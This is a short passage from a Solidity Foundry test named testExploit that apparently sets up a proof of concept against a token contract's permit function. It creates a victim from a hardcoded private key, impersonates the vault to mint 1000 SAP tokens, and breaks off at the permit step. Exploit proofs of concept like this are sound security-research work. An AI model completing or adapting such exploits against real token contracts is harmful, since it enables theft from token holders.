    function testExploit() public {
        // Step 1: Create a victim with known private key
        uint256 victimPrivateKey = 0x1234567890AbcdEF1234567890aBcdef1234567890abcdef1234567890abcdef;
        address victim = vm.addr(victimPrivateKey);
        vm.label(victim, "Victim");

        // Step 2: Mint tokens to victim
        address vault = ISapToken(TARGET).vault();
        vm.startPrank(vault);
        ISapToken(TARGET).mint(victim, 1000 * 10**9); // 1000 SAP tokens (9 decimals)
        vm.stopPrank();

        // Verify victim has tokens
        uint256 victimBalance = ISapToken(TARGET).balanceOf(victim);
        require(victimBalance > 0, "Victim should have tokens");

        // Step 3: Define permit parameters
